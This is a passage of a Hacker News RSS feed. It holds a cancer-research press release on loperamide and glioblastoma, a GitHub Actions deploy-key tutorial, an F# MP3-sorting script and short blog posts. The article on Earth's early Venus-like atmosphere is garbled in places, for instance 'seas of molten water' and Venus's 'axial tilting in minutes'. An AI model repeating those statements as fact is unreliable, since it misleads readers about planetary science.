loperamide, a drug commonly used against diarrhoea, proves effective against
glioblastoma cells. A research team at Goethe University has now unravelled the
drug’s mechanisms &nbsp;of action of cell
death induction and – in doing so – has shown how this compound could help attack
brain tumours that otherwise are difficult to treat.</strong></p>



<p>The research group led by Dr Sjoerd van Wijk from the Institute of Experimental Cancer Research in Paediatrics at Goethe University already two years ago found evidence indicating that the anti-diarrhoea drug loperamide could be used to induce cell death in glioblastoma cell lines. They have now deciphered its mechanism of action and, in doing so, are opening new avenues for the development of novel treatment strategies.</p>







<h3><strong>When cells digest themselves</strong></h3>



<p>In certain types of tumour cells, administration
of loperamide leads to a stress response in the endoplasmic reticulum (ER), the
cell organelle responsible for key steps in protein synthesis in the body. The
stress in the ER triggers its degradation, followed by self-destruction of the
cells. This mechanism, known as autophagy-dependent cell death occurs when
cells undergo hyperactivated autophagy. Normally, autophagy regulates normal
metabolic processes and breaks down and recycles the valuable parts of damaged
or superfluous cell components thus ensuring the cell’s survival, for example
in the case of nutrient deficiency. In certain tumour cells, however, hyperactivation
of autophagy destroys so much cell material that they are no longer capable of
surviving.</p>



<p>“Our experiments with cell lines show that
autophagy could support the treatment of glioblastoma brain tumours,” says van
Wijk. Glioblastoma is a very aggressive and lethal type of cancer in children
and adults that shows only a poor response to chemotherapy. New therapeutic
approaches are therefore urgently required. The research group led by van Wijk
has now identified an important factor that links the ER stress response with
the degradation of the ER (reticulophagy):&nbsp;
The “Activating Transcription Factor” ATF4 is
produced in increased amounts both during ER stress and under the influence of
loperamide. It triggers the destruction of the ER membranes and thus of the ER.</p>







<h3><strong>Anti-diarrhoea drug
triggers cell death in glioblastoma cells</strong></h3>



<p>“Conversely, if we block ATF4, far fewer
cells in a tumour cell culture die after adding loperamide,” says van Wijk,
describing the control results. In addition, the research group was able to detect
ER debris in loperamide-treated cells under the electron microscope. “ER
degradation, that is, reticulophagy, visibly contributes to the demise of
glioblastoma cells,” says van Wijk. The team also showed that loperamide triggers
only autophagy but not cell death in other cells, such as embryonic mouse
fibroblasts. “Normally, loperamide, when taken as a remedy against diarrhoea,
binds to particular binding sites in the intestine and is not taken up by the
bowel and is therefore harmless”.</p>







<h3><strong>Mechanism of action
also applicable to other diseases</strong></h3>



<p>The loperamide-induced death of
glioblastoma cells could help in the development of new therapeutic approaches
for the treatment of this severe form of cancer. “However, our findings also
open up exciting new possibilities for the treatment of other diseases where ER
degradation is disrupted, such as neurological disorders or dementia as well as
other types of tumour,” says van Wijk. However, further studies are necessary before
loperamide can actually be used in the treatment of glioblastoma or other
diseases. In future studies it has to be explored, for example, how loperamide
can be transported into the brain and cross the blood-brain barrier.
Nanoparticles might be a feasible option. The research team in Frankfurt now wants
to identify other substances that trigger reticulophagy and examine how the
effect of loperamide can be increased and better understood.</p>



<p>The research group led by Sjoerd van Wijk
is funded by the Frankfurt Foundation for Children with Cancer (<em>Frankfurter
Stiftung für krebskranke Kinder</em>) and the Collaborative Research Centre 1177
“Molecular and Functional Characterisation of Selective Autophagy” funded by
the German Research Foundation (Deutsche Forschungsgemeinschaft). The work is
the result of collaboration with Dr Muriel Mari and Professor Fulvio Reggiori
(University of Groningen, The Netherlands) and Professor Donat Kögel
(Experimental Neurosurgery, Goethe University).</p>



<p><strong>Publication:
</strong>Svenja Zielke, Simon Kardo, Laura Zein,
Muriel Mari, Adriana Covarrubias-Pinto, Maximilian N. Kinzler, Nina Meyer,
Alexandra Stolz, Simone Fulda, Fulvio Reggiori, Donat Kögel and Sjoerd van
Wijk: <strong>ATF4 links ER stress with
reticulophagy in glioblastoma cells</strong>. Taylor &amp; Francis Online <a href="https://doi.org/10.1080/15548627.2020.1827780">https://doi.org/10.1080/15548627.2020.1827780</a></p>

	
	
	
	
	
	
</article><!-- #post-48447 -->
				

			</div></div>]]>
            </description>
            <link>https://aktuelles.uni-frankfurt.de/englisch/anti-diarrhoea-drug-drives-cancer-cells-to-cell-death/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518831</guid>
            <pubDate>Wed, 23 Dec 2020 15:52:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A program that allow kids to foresee major life milestones before 30s]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25518798">thread link</a>) | @tpkahlon
<br/>
December 23, 2020 | https://tpkahlon.github.io/javascript/50/ | <a href="https://web.archive.org/web/*/https://tpkahlon.github.io/javascript/50/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app">
      <form id="form">
        
        <p>
          A helpful guide for kids wishing to foresee their future and plan
          accordingly!
        </p>
        <p><label for="date">Choose/Enter your Date of Birth e.g. 2013/04/23</label>
          
          
        </p>
      </form>
      
    </div></div>]]>
            </description>
            <link>https://tpkahlon.github.io/javascript/50/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518798</guid>
            <pubDate>Wed, 23 Dec 2020 15:49:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Private repos and submodules with GH Actions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25518321">thread link</a>) | @HaoZeke
<br/>
December 23, 2020 | https://rgoswami.me/posts/priv-gh-actions/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/priv-gh-actions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>A workflow for managing private submodules in a private repository without personal access tokens for Github actions</p></blockquote><h2 id="background">Background</h2><p>Ever since Travis CI decided to drink <a href="https://blog.travis-ci.com/2020-11-02-travis-ci-new-billing">corporate kool-aid</a>, the search for a new CI has been brought to the fore again. <a href="https://github.com/features/actions">Github Actions</a> seem uniquely suited for private repositories, since most CIs bill for private repos. However, the basic authentication setup for the <a href="https://github.com/actions/checkout">checkout action</a> involves using one SSH key, effectively a personal access token, for both the <a href="https://github.com/actions/checkout/issues/116#issuecomment-708092052">main project and all submodules</a>. This is untenable for anyone working with a team.</p><h2 id="solution">Solution</h2><p>The fix, as it were, is in two steps. We will first require a deploy key to be set for the private submodule, and then store the private portion in the private repo. We will begin with a concrete setup.</p><h3 id="setup">Setup</h3><p>Consider a standard C++ build setup:</p><div><pre><code data-lang="yaml"><span>name</span><span>:</span><span> </span>Fake<span> </span>secret<span> </span>project<span>
</span><span>
</span><span></span><span>on</span><span>:</span><span>
</span><span>  </span><span>push</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span>master<span>,</span><span> </span>development<span>]</span><span>
</span><span>  </span><span>pull_request</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span>master<span>]</span><span>
</span><span>
</span><span></span><span>jobs</span><span>:</span><span>
</span><span>  </span><span>build</span><span>:</span><span>
</span><span>    </span><span>runs-on</span><span>:</span><span> </span>${{<span> </span>matrix.os<span> </span>}}<span>
</span><span>
</span><span>    </span><span>strategy</span><span>:</span><span>
</span><span>      </span><span>max-parallel</span><span>:</span><span> </span><span>4</span><span>
</span><span>      </span><span>matrix</span><span>:</span><span>
</span><span>        </span><span>os</span><span>:</span><span> </span><span>[</span>ubuntu<span>-18.04</span><span>]</span><span>
</span><span>        </span><span>cpp-version</span><span>:</span><span> </span><span>[</span>g++-<span>7</span><span>,</span><span> </span>g++-<span>9</span><span>,</span><span> </span>clang++<span>]</span><span>
</span><span>
</span><span>    </span><span>steps</span><span>:</span><span>
</span><span>      </span>- <span>uses</span><span>:</span><span> </span>actions/checkout@v2<span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span>build<span>
</span><span>        </span><span>env</span><span>:</span><span>
</span><span>          </span><span>CXX</span><span>:</span><span> </span>${{<span> </span>matrix.cpp-version<span> </span>}}<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          mkdir build &amp;&amp; cd build</span><span>
</span><span>          </span>cmake<span> </span>-DCMAKE_CXX_COMPILER=<span>"$CXX"</span><span> </span>-DCMAKE_CXX_FLAGS=<span>"-std=c++11"</span><span> </span>../<span>
</span><span>          </span>make<span> </span>-j$(nproc)<span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span>run<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          ./super_secret</span><span>
</span></code></pre></div><h3 id="key-generation">Key Generation</h3><p>This section is standard. We will generate a deploy key essentially. Note that it isn’t necessary to set a password, using one would only minimally improve security and bring in some annoying script modifications.</p><div><pre><code data-lang="bash"><span># Anywhere safe</span>
ssh-keygen -t rsa -b <span>4096</span> -C <span>"Fake Deployment Key"</span> -f <span>'priv_sub_a'</span> -N <span>''</span>
</code></pre></div><h3 id="private-submodule-repo">Private Submodule Repo</h3><p>We will store the <strong>public portion of the key</strong> as a deploy key in the <strong>private submodule repository</strong>.</p><div><pre><code data-lang="bash"><span># Copy contents</span>
cat priv_sub_a.pub <span>|</span> xclip -selection clipboard
</code></pre></div><p>Note that, as shown in Fig. <a href="#orgc69a369">1</a> we do not need to give write access to this key.</p><figure><img src="https://d33wubrfki0l68.cloudfront.net/13fceb9a9ad102125d9b554fbd9eeb3bd7b1a569/0b1b9/ox-hugo/2020-12-23_14-18-40_screenshot.png"></figure><h3 id="private-project-repo">Private Project Repo</h3><p>Now we will need the <strong>private portion of the key</strong> as a secret in the <strong>private project repository</strong> (see Fig. <a href="#orga264e75">2</a>).</p><div><pre><code data-lang="bash"><span># Copy contents of private key</span>
cat priv_sub_a <span>|</span> xclip -selection clipboard
</code></pre></div><figure><img src="https://d33wubrfki0l68.cloudfront.net/8735f226603a65f98097f5a1e74b4294f4d41a30/79a19/ox-hugo/2020-12-23_14-21-36_screenshot.png" alt="Figure 1: Secret setup in the private project"><figcaption><p>Figure 1: Secret setup in the private project</p></figcaption></figure><h3 id="workflow-modifications">Workflow Modifications</h3><p>Now we will simply update our workflow&nbsp;<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. We will simply add the following step:</p><div><pre><code data-lang="yaml">- <span>name</span><span>:</span><span> </span>get_subm<span>
</span><span>  </span><span>env</span><span>:</span><span>
</span><span>    </span><span>SSHK</span><span>:</span><span> </span>${{<span> </span>secrets.SUB_SSHK_A<span> </span>}}<span>
</span><span>  </span><span>run</span><span>:</span><span> </span><span>|
</span><span>    mkdir -p $HOME/.ssh</span><span>
</span><span>    </span>echo<span> </span><span>"$SSHK"</span><span> </span>&gt;<span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>chmod<span> </span><span>600</span><span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>export<span> </span>GIT_SSH_COMMAND=<span>"ssh -i $HOME/.ssh/ssh.key"</span><span>
</span><span>    </span>git<span> </span>submodule<span> </span>update<span> </span>--init<span> </span>--recursive<span>
</span></code></pre></div><p>This will work for a single private submodule and multiple public submodules. For multiple private submodules, we would not initialize them recursively, but instead use a separate key for each.</p><div><pre><code data-lang="yaml">- <span>name</span><span>:</span><span> </span>get_subm_a<span>
</span><span>  </span><span>env</span><span>:</span><span>
</span><span>    </span><span>SSHK</span><span>:</span><span> </span>${{<span> </span>secrets.SUB_SSHK_A<span> </span>}}<span>
</span><span>  </span><span>run</span><span>:</span><span> </span><span>|
</span><span>    mkdir -p $HOME/.ssh</span><span>
</span><span>    </span>echo<span> </span><span>"$SSHK"</span><span> </span>&gt;<span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>chmod<span> </span><span>600</span><span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>export<span> </span>GIT_SSH_COMMAND=<span>"ssh -i $HOME/.ssh/ssh.key"</span><span>
</span><span>    </span>git<span> </span>submodule<span> </span>update<span> </span>--init<span> </span>-- &lt;specific<span> </span>relative<span> </span>path<span> </span>to<span> </span>submodule<span> </span>A&gt;<span>
</span><span></span>- <span>name</span><span>:</span><span> </span>get_subm_b<span>
</span><span>  </span><span>env</span><span>:</span><span>
</span><span>    </span><span>SSHK</span><span>:</span><span> </span>${{<span> </span>secrets.SUB_SSHK_B<span> </span>}}<span>
</span><span>  </span><span>run</span><span>:</span><span> </span><span>|
</span><span>    mkdir -p $HOME/.ssh</span><span>
</span><span>    </span>echo<span> </span><span>"$SSHK"</span><span> </span>&gt;<span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>chmod<span> </span><span>600</span><span> </span>$HOME/.ssh/ssh.key<span>
</span><span>    </span>export<span> </span>GIT_SSH_COMMAND=<span>"ssh -i $HOME/.ssh/ssh.key"</span><span>
</span><span>    </span>git<span> </span>submodule<span> </span>update<span> </span>--init<span> </span>-- &lt;specific<span> </span>relative<span> </span>path<span> </span>to<span> </span>submodule<span> </span>B&gt;<span>
</span></code></pre></div><p>Note that it is not possible to use the same SSH key in multiple submodule repositories, as each deploy key can only be associated with one repository.</p><h3 id="complete-workflow">Complete Workflow</h3><p>Putting the above steps together, for the case of a single private submodule and multiple public submodules, we have:</p><div><pre><code data-lang="yaml"><span>name</span><span>:</span><span> </span>Fake<span> </span>secret<span> </span>project<span>
</span><span>
</span><span></span><span>on</span><span>:</span><span>
</span><span>  </span><span>push</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span>master<span>,</span><span> </span>development<span>]</span><span>
</span><span>  </span><span>pull_request</span><span>:</span><span>
</span><span>    </span><span>branches</span><span>:</span><span> </span><span>[</span>master<span>]</span><span>
</span><span>
</span><span></span><span>jobs</span><span>:</span><span>
</span><span>  </span><span>build</span><span>:</span><span>
</span><span>    </span><span>runs-on</span><span>:</span><span> </span>${{<span> </span>matrix.os<span> </span>}}<span>
</span><span>
</span><span>    </span><span>strategy</span><span>:</span><span>
</span><span>      </span><span>max-parallel</span><span>:</span><span> </span><span>4</span><span>
</span><span>      </span><span>matrix</span><span>:</span><span>
</span><span>        </span><span>os</span><span>:</span><span> </span><span>[</span>ubuntu<span>-18.04</span><span>]</span><span>
</span><span>        </span><span>cpp-version</span><span>:</span><span> </span><span>[</span>g++-<span>7</span><span>,</span><span> </span>g++-<span>9</span><span>,</span><span> </span>clang++<span>]</span><span>
</span><span>
</span><span>    </span><span>steps</span><span>:</span><span>
</span><span>      </span>- <span>uses</span><span>:</span><span> </span>actions/checkout@v2<span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span>get_subm<span>
</span><span>        </span><span>env</span><span>:</span><span>
</span><span>          </span><span>SSHK</span><span>:</span><span> </span>${{<span> </span>secrets.SUB_SSHK_A<span> </span>}}<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          mkdir -p $HOME/.ssh</span><span>
</span><span>          </span>echo<span> </span><span>"$SSHK"</span><span> </span>&gt;<span> </span>$HOME/.ssh/ssh.key<span>
</span><span>          </span>chmod<span> </span><span>600</span><span> </span>$HOME/.ssh/ssh.key<span>
</span><span>          </span>export<span> </span>GIT_SSH_COMMAND=<span>"ssh -i $HOME/.ssh/ssh.key"</span><span>
</span><span>          </span>git<span> </span>submodule<span> </span>update<span> </span>--init<span> </span>--recursive<span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span>build<span>
</span><span>        </span><span>env</span><span>:</span><span>
</span><span>          </span><span>CXX</span><span>:</span><span> </span>${{<span> </span>matrix.cpp-version<span> </span>}}<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          mkdir build &amp;&amp; cd build</span><span>
</span><span>          </span>cmake<span> </span>-DCMAKE_CXX_COMPILER=<span>"$CXX"</span><span> </span>-DCMAKE_CXX_FLAGS=<span>"-std=c++11"</span><span> </span>../<span>
</span><span>          </span>make<span> </span>-j$(nproc)<span>
</span><span>      </span>- <span>name</span><span>:</span><span> </span>run<span>
</span><span>        </span><span>run</span><span>:</span><span> </span><span>|
</span><span>          ./super_secret</span><span>
</span></code></pre></div><h2 id="conclusions">Conclusions</h2><p>We have demonstrated a minimally invasive setup for working with a private submodule, which is trivially extensible to multiple such submodules. With this, it appears that GH actions might a viable option (as opposed to say, <a href="https://app.wercker.com/">Wercker</a>), at least for private teams. A more full comparative post might be warranted at a later date.</p><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p><a href="https://github.com/jwsi/submodule-checkout">submodule-checkout</a> uses a similar concept but unfortunately does not extend to multiple submodules and the submodules are checked out as <code>root</code> <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li></ol></section></div></div>]]>
            </description>
            <link>https://rgoswami.me/posts/priv-gh-actions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518321</guid>
            <pubDate>Wed, 23 Dec 2020 15:11:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Earth Had a Venus-Like Toxic Atmosphere, Before It Became Habitable]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25518146">thread link</a>) | @voldemort1968
<br/>
December 23, 2020 | https://smosa.com/earth-had-a-venus-like-toxic-atmosphere-before-it-became-habitable/ | <a href="https://web.archive.org/web/*/https://smosa.com/earth-had-a-venus-like-toxic-atmosphere-before-it-became-habitable/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>In a research summary posted on <a href="https://theconversation.com/ancient-earth-had-a-thick-toxic-atmosphere-like-venus-until-it-cooled-off-and-became-liveable-150934">The Conversation</a>, scientists attempted to recreate the chemical equilibrium of the cooling magmatic ocean which covered the planet billions of years ago. </p><p>The Earth arose out of a mechanism in which small objects snap to create larger and larger bodies. Using such a mechanism in the history of the earth would have enveloped our planet in a magmatic ocean; an ocean like this would have leaked into our planet the initial atmosphere, and a sufficient cooling to condense water vapor from the air to form condensed seas of water.</p><p>Venus never cooled down sufficiently to form water oceans. H2O in the atmosphere remained as water vapor and was lent to space steadily but inexorably. Earth became more favorable to life, whilst Venus became more and more inhospitable.</p><figure><img src="https://smosa.com/content/images/2020/12/Radar_Globe_of_Venus.gif" alt=""><figcaption>Henrik Hargitai, <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>, via Wikimedia Commons</figcaption></figure><p>Venus has an incredibly thick atmosphere composed of 96.5% carbon dioxide, 3.5% nitrogen, traced by other gasses, including sulfur dioxide. The atmosphere density of Venus is 93 times that of Earth, while the surface pressure is approximally 92 times that of Earth – a pressure equal to that almost 1 km (5⁄8 mi) deep below the Earth's oceans.</p><p>This atmosphere creates a heavy greenhouse effect in the solar energy system, producing a surface temperature of a minimum of 735 k (462 ° C; 864 ° F) and makes Venus' surface hotter than Mercury's.</p><figure><img src="https://smosa.com/content/images/2020/12/Venus-pacific-levelled-gigapixel-scale-4_00x.jpg" alt="" srcset="https://smosa.com/content/images/size/w600/2020/12/Venus-pacific-levelled-gigapixel-scale-4_00x.jpg 600w, https://smosa.com/content/images/size/w1000/2020/12/Venus-pacific-levelled-gigapixel-scale-4_00x.jpg 1000w, https://smosa.com/content/images/size/w1600/2020/12/Venus-pacific-levelled-gigapixel-scale-4_00x.jpg 1600w, https://smosa.com/content/images/size/w2400/2020/12/Venus-pacific-levelled-gigapixel-scale-4_00x.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>By Brocken Inaglory - File:Venus with reflection.jpg, <a href="https://commons.wikimedia.org/w/index.php?curid=5223759">CC BY-SA 3.0</a></figcaption></figure><p>Astronomers have identified a cyclical fluctuation of the absorption of sunlight by the atmosphere. The axial tilting of Venus in minutes also minimizes the variation of a seasonal temperature. Studies suggest the atmosphere of Venus may have been much like the one surrounding earth, billions of years ago. Today, surface conditions are no longer suitable for any earthly life formed before the event. The likelihood of life in the top cloud layers of Venus 50 km (30 mi) up from the surface has been hypothesized, but the surrounding atmosphere is acidic.</p><p>According to the article, The Earth comes into being via a mechanism called the "accretion" in which tiny particles briefly clump together under the pull of gravity to form larger and larger bodies. The collision would have left Earth in a worldwide layer of rock called a "magma ocean" which would have poured into the first atmosphere of Planet hydrogen, sulfur, oxygen and nitrogen.</p><p>"If there's a lot of oxygen, it's bound in a 3:2-ratio to iron," researchers say, "We have multiple mantle samples, some of them carried to the surface by volcanic eruptions."</p><p>The early earth cooled down sufficiently to condense water vapor out of the atmosphere, creating seas of molten water like we have now. That will have left an atmosphere of 97% CO2 and 3% N.</p><p>Venus never cooled down sufficiently to form water oceans. H2O in the atmosphere remained as water vapor and was lent to space steadily but inexorably. On earth the seas have slowly but gradually washed down CO2 from the atmosphere. Earth was made more life-friendly while Venus grew even more inhospitable.</p>
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/earth-had-a-venus-like-toxic-atmosphere-before-it-became-habitable/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518146</guid>
            <pubDate>Wed, 23 Dec 2020 14:53:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How YouTube Music forced me to try F#]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25518128">thread link</a>) | @ry8806
<br/>
December 23, 2020 | https://www.ryansouthgate.com/2020/12/22/how-youtube-music-forced-me-to-try-f/ | <a href="https://web.archive.org/web/*/https://www.ryansouthgate.com/2020/12/22/how-youtube-music-forced-me-to-try-f/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.ryansouthgate.com/content/images/size/w300/2020/12/simon-noh-0rmby-3OTeI-unsplash.jpg 300w,
                            https://www.ryansouthgate.com/content/images/size/w600/2020/12/simon-noh-0rmby-3OTeI-unsplash.jpg 600w,
                            https://www.ryansouthgate.com/content/images/size/w1000/2020/12/simon-noh-0rmby-3OTeI-unsplash.jpg 1000w,
                            https://www.ryansouthgate.com/content/images/size/w2000/2020/12/simon-noh-0rmby-3OTeI-unsplash.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.ryansouthgate.com/content/images/size/w2000/2020/12/simon-noh-0rmby-3OTeI-unsplash.jpg" alt="How YouTube Music forced me to try F#">
            </figure>

            <section>
                <div>
                    <h4 id="intro">Intro</h4><div><p>This blog post details my first experience of writing F# code. I've been interested in learning F# for about a year now, however never really got round to it as I don't get to use it in my day-job. I even attended a F# Meetup in Coventry, at the start of the year, before 2020 took a nose-dive.</p><p>A few months ago, I got the email that so many had received, GoogleMusic was shutting down and users were advised to migrate over to YouTube music. I have uploaded over 8,000 songs in GoogleMusic, love the minimalist interface and use it almost daily. I was a bit gutted as it's a piece of software I have used for years and years, works great on my Android phone and it just gets the job done.</p><p>I did as I was told and clicked the migrate button, to transfer all the songs to YouTube Music. After the wait, the first impressions weren't great. YouTube Music is terrible, I'm not going to spend the whole post ripping into it, but the separation between music I own (uploaded) and YouTube Content isn't well defined, you go and find a song you want to play, get there and realise it's playing from the YouTube Content database rather than your own copy - so you get some nice ads. Also the whole experience feels half-baked, more-so on the "personal library" side of things. Almost like they're trying to discourage you from uploading your own copies of music, and instead buying/listening from their ad-supported media.</p></div><!--kg-card-begin: markdown--><p>(I've heard of <a href="https://funkwhale.audio/">FunkWhale</a> and have began researching that to see if that'll fit my needs - planning to really give it a go in 2021!)</p>
<!--kg-card-end: markdown--><div><p>Anyway, back to how YouTube Music forced me into F#...</p><p>Hating the YouTube Music experience I immediately started looking for ways to download my entire library. I do have the original copies of all my tracks, but they're on an old HDD in the loft of my parent's house - so for now, just wanted something to work with.After GoogleMusic had been retired it's not possible to download all the tracks you had stored.......bummer!</p></div><!--kg-card-begin: markdown--><p>However, I stumbled across an article which suggested using <a href="https://takeout.google.com/">Google Takeout</a> to download my music library. Google Takeout is a service where Google will make it easy to download all your data that they've got. How nice of them...!</p>
<!--kg-card-end: markdown--><div><p>Right, I started the download of 80GB of music and waited. Opened up the `.zip ` files to find that it's a totally flat file structure, the tidy folder structure the songs sat in was no more. Used to be Artist -&gt; Album -&gt; <em>*tracks*</em>.</p><p>I was seconds away from creating a new C# (netcore) console app and fixing this. Would have taken less than 15 mins and I would have my music all nicely sorted again. Great....but I wouldn't have learned anything and I've been wanting to try F# for a while. So, I gave it a go in F# - took a lot longer than 15 mins, maybe a few hours, on and off. But it works and sorts all 8,000 songs pretty quickly and does a good job too!</p></div><h4 id="the-application">The Application</h4><p>The Application itself is pretty simple, an absolute novice with F# like me can read this and get the general idea of what's going on. It's also really small too, so small in fact that it's embedded below. I've done my best at commenting it inline to show what's going on.</p><!--kg-card-begin: markdown--><p>Note: This is my first attempt at F#, it's likely non-optimal and not representative of what proper F# devs would write. Please do let me know how it can be improved. I'm on <a href="https://twitter.com/ryan_southgate">Twitter @ryan_southgate</a></p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>open System.IO
open Id3 // NuGet package reference (for mp3 ID3 tags): ID3

type GoogleMusicSong = {
    path: string
    artist: string
    album: string
}

/// Where the Sorted Songs will end up
let outputFolder = @"C:\Temp\GoogleMusicSorter\"

/// Invalid characters to remove from a directory path
let invalidChars = [| '*'; '!'; '.'; ':'; '?'; '"' |]

let getMp3Details (filename: string) = 
    let tag = (new Mp3(filename)).GetTag(Id3TagFamily.Version2X)
    let artist =
        match tag.Artists.Value.Count with
        | 0 -&gt; "Unknown"
        | _ -&gt; tag.Artists.Value.[0]
    { path = filename; artist = artist; album = tag.Album.Value };

/// Removes the invalid characters from the given string
let makeSafe = String.collect (fun c -&gt; if Seq.exists((=)c) invalidChars then "" else string c)

/// Gets the "Safe" folder name for an Artist &amp; Album
let getFolder folderName = 
    match folderName with
    | null | "" -&gt; ""
    | _ -&gt; makeSafe folderName

/// Gets the new Directory path for a Song
let getPath song = System.IO.Path.Combine(outputFolder, getFolder song.artist, getFolder song.album).ToString();

[&lt;EntryPoint&gt;]
let main argv =
    let rootFolder = argv.[0];

    let mp3sAndPaths = System.IO.Directory.GetFiles(rootFolder, "*.mp3") 
                       |&gt; Array.map getMp3Details
                       |&gt; Array.map (fun x -&gt; (getPath x, x))

    for tp in mp3sAndPaths do 
        let (f, mp3) = tp
        
        Directory.CreateDirectory(f) |&gt; ignore
        printf "Created Directory: %s \n" f

        let newFileLocation = match mp3.path.Split(".mp3").Length with
                                | 1 -&gt; mp3.path
                                | _ -&gt; mp3.path.Substring(0, mp3.path.IndexOf(".") + 4)

        let newFilePath = new FileInfo(newFileLocation)
        File.Copy(mp3.path, Path.Combine(f, newFilePath.Name))
        printf "Copied File: %s \n" mp3.path

    printf "Moved %i songs" mp3sAndPaths.Length

    0 // return an integer exit code

</code></pre>
<!--kg-card-end: markdown--><p><br>Below are a few thoughts on my experience with F#, what I liked and what I didn't. I'm primarily a C# Developer, so comparisons/observations below are with C#.</p><h4 id="what-i-liked">What I Liked</h4><!--kg-card-begin: markdown--><ul>
<li>I refactored the code twice, without running it - and it worked flawlessly. I'd seldom do this with C#, I run quite regularly in my "dev-loop" and like to compile/run/hit breakpoints as I go.</li>
<li>it's only 60 lines, and is pretty neat, there's no "cruft" (like curly braces), no need for classes (in separate files), no "platform code" (static methods, hepler classes) almost, just code that actually does stuff (instead of Static classes with methods etc)</li>
<li>Type inference, it just worked, there's only 1 reference to "GoogleMusicSong" where as in C# there'd be a few (method params etc)</li>
<li>Putting it all in one file doesn't feel messy, I wouldn't leave this all in one file in C#, it would be split up into separate classes/files</li>
<li>Solution explorer is a waste of space now, there's one proj, with one file - for small console apps like this, I can minimise it</li>
<li>Match statements force you to account for all possibilities and makes sure I haven't forgot a case, C# (<code>if</code>s / <code>switch</code> statements) are more lenient and assume I always know what I'm doing</li>
</ul>
<!--kg-card-end: markdown--><h4 id="what-i-didn-t-like">What I Didn't Like</h4><!--kg-card-begin: markdown--><ul>
<li>Intellisense (F12-ing) onto string.contains to see overloads etc doesn't work. This might be something wrong with my installation, but F12-ing onto other members works fine, just that this one doesn't</li>
<li>Lack of intellisense comments on .Net methods mp3/path.split when hovering over them I can't see any description or parameters descriptions. But works fine on Directory.CreateDirectory</li>
<li>My "dev loop" - I'm in the habit of hitting F5 to test code I've just written and add breakpoints at a place where I can inspect the values of new variables I've added. In hindsight I probably should have used F# interactive mode.</li>
</ul>
<!--kg-card-end: markdown--><h4 id="conclusion">Conclusion</h4><p>All in all I enjoyed the experience, I'm going to continue chipping away at F#. C# recently (to me), seems to be getting more and more "functional features", so getting a head-start on these is never a bad thing, also increasing exposure to Functional Programming will aid my thinking/reasoning when developing in OO (Object Oriented) programs too.</p><!--kg-card-begin: markdown--><p>If you've got some improvements to the code above, or some advice (maybe a good book/online learning resource), then I'd love to hear about it and give it a go. Reach out to me on <a href="https://twitter.com/ryan_southgate">Twitter</a></p>
<!--kg-card-end: markdown--><p>Thanks for reading :)</p>
                </div>
            </section>


            
            
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.ryansouthgate.com/2020/12/22/how-youtube-music-forced-me-to-try-f/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518128</guid>
            <pubDate>Wed, 23 Dec 2020 14:51:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2020: My Year of Mantras]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25518020">thread link</a>) | @mcrittenden
<br/>
December 23, 2020 | https://critter.blog/2020/12/23/2020-my-year-of-mantras/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/12/23/2020-my-year-of-mantras/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

	<div>

		
			<!-- .entry-categories -->

			
			<p>It’s been a year full of life rules for me. These are the ones that have stuck.</p>

			
		<!-- .post-meta-wrapper -->

		
	</div><!-- .entry-header-inner -->

</div></div>]]>
